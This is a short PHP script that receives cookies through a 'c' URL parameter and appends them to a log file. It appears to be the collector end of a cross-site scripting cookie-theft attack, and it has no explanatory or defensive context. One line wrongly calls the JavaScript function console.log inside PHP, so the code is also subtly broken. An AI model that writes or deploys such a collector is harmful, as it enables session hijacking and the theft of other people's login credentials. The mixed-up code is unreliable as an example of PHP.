<?php
$cookies = $_GET["c"];
console.log($cookies);
$file = fopen('log.txt', 'a');
fwrite($file, $cookies . "\n\n");
?>